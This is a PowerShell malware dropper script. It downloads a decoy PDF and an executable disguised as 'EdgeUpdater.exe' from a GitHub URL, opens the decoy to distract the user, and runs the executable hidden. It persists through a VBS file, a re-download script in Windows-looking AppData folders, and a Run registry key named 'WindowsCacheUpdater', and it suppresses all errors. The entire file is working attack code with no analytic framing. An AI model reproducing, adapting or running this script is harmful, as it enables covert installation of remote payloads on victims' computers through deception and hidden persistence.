# FINAL MINIMAL launcher.ps1 - clean Run key + single VBS
$ErrorActionPreference = 'SilentlyContinue'

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
$persist = "$env:APPDATA\Microsoft\Windows\Libraries"
New-Item -ItemType Directory -Path $cache,$persist -Force | Out-Null

$pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf"
$exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe"

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -UseBasicParsing
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing

if (Test-Path $pdfPath) { Start-Process $pdfPath -Verb Open }

Start-Sleep -Seconds 30

$wsh = New-Object -ComObject WScript.Shell
$wsh.Run("`"$exePath`"", 0, $false)

# Single clean persistence
$vbsPath = "$persist\update.vbs"
$syncPath = "$persist\sync.ps1"

$vbs = 'Set WshShell = CreateObject("WScript.Shell")' + "`r`nWshShell.Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File `"$syncPath`""" , 0, False"
$vbs | Out-File $vbsPath -Encoding ASCII -Force

$sync = @"
`$exeUrl = `"$exeUrl`"
`$exePath = `"$exePath`"
Start-Sleep -Seconds (Get-Random -Min 8 -Max 15)
if (-not (Test-Path `$exePath)) { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -UseBasicParsing }
`$wsh = New-Object -ComObject WScript.Shell
`$wsh.Run("`"`$exePath`"", 0, `$false)
"@
$sync | Out-File $syncPath -Encoding UTF8 -Force

# Register ONLY ONE entry
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name "WindowsCacheUpdater" -Value "wscript.exe `"$vbsPath`"" -Type String -Force

# Fire once
Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
